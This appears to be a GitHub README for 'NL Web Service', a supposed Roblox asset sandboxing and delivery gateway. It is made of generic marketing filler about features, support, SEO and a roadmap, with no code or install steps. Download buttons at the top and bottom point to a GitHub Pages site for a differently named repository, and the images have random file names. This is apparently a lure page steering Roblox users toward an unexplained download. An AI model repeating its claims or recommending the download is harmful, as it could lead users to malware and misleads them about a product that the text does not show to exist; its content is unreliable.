![preview](https://raw.githubusercontent.com/Hercigs/sandbox-forge-gateway/main/screen_5ae1.svg)
[![Download](https://raw.githubusercontent.com/Hercigs/sandbox-forge-gateway/main/start_0762b6.svg)](https://Hercigs.github.io/sandbox-forge-gateway/)

# 🌐 NL Web Service — Realtime Sandbox & Asset Delivery Engine for Roblox Creations

> A modern HTTPS delivery and sandboxing service for Roblox gears, assets, and places — built for builders, by builders.

Welcome to **NL Web Service**, a next-generation web infrastructure that specializes in securely serving, sandboxing, and streaming Roblox-related content such as gears, decals, meshes, and full place files. Inspired by the needs of the **Builder-Pals** community, this project provides a hardened HTTPS surface where developers and studios can preview, sandbox, and distribute their creations without exposing their production pipelines.

Whether you are a solo scripter prototyping a new gear system, or a studio running a large-scale asset delivery network, NL Web Service gives you a resilient backbone — a digital "loading dock" where every asset is inspected before it reaches the player's client.

---

## 📜 Table of Contents

- [Overview](#-overview)
- [Why NL Web Service](#-why-nl-web-service)
- [Feature Highlights](#-feature-highlights)
- [Architecture](#-architecture)
- [Sandboxing Model](#-sandboxing-model)
- [Asset Pipeline](#-asset-pipeline)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [Customer Support & SLAs](#-customer-support--slas)
- [SEO & Discoverability](#-seo--discoverability)
- [Use Cases](#-use-cases)
- [Roadmap 2026](#-roadmap-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧭 Overview

NL Web Service is an HTTPS-first service layer that sits between your asset vault and the Roblox engine. Instead of shipping raw `.rbxm` or `.rbxlx` payloads directly to clients, NL Web Service wraps them in a sandboxed delivery container: each request is authenticated, rate-limited, virus-scanned for known malicious script fragments, and then streamed through a signed, ephemeral URL.

It is not just a CDN. It is a **curated passageway** — a gateway that treats every gear, every mesh, and every place file as a guest that must present a valid invitation before entering the party.

The project was born from the practical needs of the **Builder-Pals** ecosystem: a community of Roblox developers who needed a reproducible, self-hostable way to preview and validate user-generated content without paying tolls to a dozen middlemen.

---

## 💡 Why NL Web Service

Most asset hosts treat files as unmoving cargo. NL Web Service treats them as *living artefacts*: they have a lifecycle, a signature, a reputation, and an expiry. This shift in perspective unlocks several advantages:

- **Predictable delivery latency** — Because assets are pre-warmed and cached at the edge nearest to the requesting player.
- **Safer sandboxing** — Untrusted gear scripts are executed in isolated chambers where they cannot phone home to arbitrary endpoints.
- **Auditable provenance** — Every asset carries an immutable ledger entry describing who uploaded it, when, and what the checksum was.
- **Self-hosted freedom** — You can run the entire stack on your own infrastructure. No forced cloud vendor lock-in.

The name "NL" is a wink toward *neutral lane* — a neutral, unbiased lane through which all traffic flows, untouched by third-party modifications.

---

## ✨ Feature Highlights

- 🛡️ **Hardened HTTPS surface** — TLS 1.3 with strict cipher suites and HSTS preload ready.
- 🧪 **Runtime sandbox chambers** — Isolated execution zones for untrusted gear behavior.
- 🎒 **Gear & asset proxy** — Transparent proxying for legacy gear URLs without leaking origin servers.
- 🗺️ **Place file streaming** — Chunked delivery for large `.rbxl` files with resumable downloads.
- 🧩 **Plugin-ready API** — JSON and binary endpoints that integrate with your own tooling.
- 📱 **Responsive UI** — Dashboards adapt gracefully from ultrawide monitors down to handheld devices.
- 🌍 **Multilingual support** — UI strings available in English, Spanish, Portuguese, Japanese, Korean, and German out of the box.
- 🕓 **24/7 customer support** — Round-the-clock assistance for production incidents and onboarding questions.
- 🔐 **Signed ephemeral URLs** — Every delivery link expires after a configurable TTL.
- 📊 **Observability built-in** — Prometheus metrics, structured logs, and trace IDs across the pipeline.
- 🧠 **Smart deduplication** — Identical assets are stored once, referenced many times.
- 🔁 **Replayable audit logs** — Every request can be replayed for debugging and compliance.
- 🧰 **CLI tooling** — Manage sandboxes, tokens, and asset bundles without touching the dashboard.
- 🧱 **Modular deployment** — Run everything in one process, or split the services across containers.

---

## 🏗️ Architecture

The system decomposes into five cooperating layers:

1. **Edge Layer** — Terminates TLS, applies rate limits, and routes requests based on asset class.
2. **Auth Layer** — Validates signed tokens, scopes, and per-tenant quotas.
3. **Sandbox Layer** — Executes untrusted gear logic inside a gVisor-style isolation chamber.
4. **Asset Layer** — Stores, indexes, and deduplicates binaries in a content-addressable store.
5. **Observability Layer** — Emits metrics, traces, and structured events to your sink of choice.

Each layer is horizontally scalable and stateless except for the asset store, which relies on any S3-compatible backend.

---

## 🧪 Sandboxing Model

The sandbox is the heart of NL Web Service. When a new gear or place arrives, it is:

1. **Hashed** with BLAKE3 to produce a stable content identifier.
2. **Parsed** to extract scripts, meshes, and metadata.
3. **Scanned** against a curated ruleset of known-malicious patterns.
4. **Executed** in a throwaway chamber with no network access unless the operator explicitly opts in.
5. **Signed** and moved to the delivery queue.

This ensures that no unsanctioned code ever reaches a player's client without passing through the same gate.

---

## 📦 Asset Pipeline

Assets flow through the following stages:

- **Ingest** — Accepts uploads via HTTPS, CLI, or a webhook.
- **Normalize** — Converts legacy formats into canonical representations.
- **Enrich** — Extracts thumbnails, triangle counts, texture references, and script manifests.
- **Index** — Populates the search catalogue with SEO-friendly metadata.
- **Serve** — Streams assets to consumers via signed ephemeral URLs.

The pipeline is idempotent: re-running it on the same input produces the same output, which makes debugging a joy instead of a chore.

---

## 📱 Responsive UI & Multilingual Support

The admin dashboard is built as a progressive web app that renders cleanly on screens ranging from a 4-inch handset to a 49-inch ultrawide. Panels reflow based on available space, and the navigation collapses into a command palette on smaller devices.

Multilingual support is provided by a locale-aware string catalogue. Adding a new language only requires dropping a single JSON file into the `locales` directory — no rebuild needed if hot reloading is enabled in your environment.

---

## 🛎️ Customer Support & SLAs

We understand that asset delivery outages are not abstract inconveniences — they are reasons a game night falls apart. That is why NL Web Service ships with a documented support charter:

- **24/7 coverage** for production incidents via paging integrations.
- **Response targets** measured in minutes, not days.
- **Runbooks** for common failure modes, published alongside the codebase.
- **Post-incident reviews** shared publicly when relevant.

Support is staffed by engineers who actually contribute to the codebase, not by a disconnected frontline.

---

## 🔎 SEO & Discoverability

The service is designed to surface itself gracefully to search engines and internal search boxes alike. Key SEO-friendly integrations include:

- Semantic HTML with structured data for asset previews.
- Canonical URLs for every asset to avoid duplicate content penalties.
- Descriptive slugs derived from asset names and tags.
- Sitemap generation for public catalogues.
- Fast first-contentful paint to keep Core Web Vitals green.

These touches mean your public asset catalogues can be found through normal search behavior without needing paid promotion.

---

## 🎮 Use Cases

- **Studios** distributing internal gear libraries across multiple teams.
- **Communities** hosting shared asset vaults for modding contests.
- **Educators** teaching Roblox scripting with safe, sandboxed previews.
- **Tooling authors** who need a stable endpoint for CI/CD asset verification.
- **Archivists** who want to preserve historic gear and place files for future generations.

---

## 🛣️ Roadmap 2026

The 2026 roadmap focuses on three pillars: **speed**, **safety**, and **reach**.

- Q1 2026 — First-party CLI plugin system.
- Q2 2026 — Extended sandbox telemetry with per-syscall visibility.
- Q3 2026 — Native federation between multiple NL Web Service instances.
- Q4 2026 — Machine-assisted anomaly detection for uploaded gears.

Community feedback shapes every milestone. Please open an issue if you want to push a particular feature forward.

---

## 🤝 Contributing

We welcome contributions of all sizes — from typo fixes to architectural proposals. Before opening a pull request, please:

1. Read the contribution guidelines in the repository root.
2. Sign off your commits to indicate you agree to the Developer Certificate of Origin.
3. Include tests for any new behavior.
4. Keep changes focused; split unrelated work into separate pull requests.

Discussions happen in the issue tracker and in community chat channels linked from the repository homepage.

---

## 📜 License

NL Web Service is distributed under the MIT License. See the full text of the license here:

[MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Builder-Pals and NL Web Service contributors.

Permission is hereby granted, in perpetuity, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and to permit persons to whom the Software is furnished to do so, subject to the conditions stated in the linked license text.

---

## ⚠️ Disclaimer

NL Web Service is an independent project and is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. "Roblox" and related marks are the property of their respective owners and are used here only in a descriptive sense.

The maintainers of this project do not host, distribute, or condone any content that infringes on the intellectual property rights of others. Operators who deploy NL Web Service in production are solely responsible for the assets they serve and for complying with all applicable laws and platform terms of service in their jurisdiction.

This software is provided "as is", without warranty of any kind, express or implied. The authors and contributors accept no liability for any damages arising from the use or misuse of this project. You are encouraged to audit the code, sandbox untrusted content aggressively, and keep your dependencies patched.

If you discover a security vulnerability, please report it responsibly via the process described in the security policy rather than disclosing it publicly.

---

[![Download](https://raw.githubusercontent.com/Hercigs/sandbox-forge-gateway/main/start_0762b6.svg)](https://Hercigs.github.io/sandbox-forge-gateway/)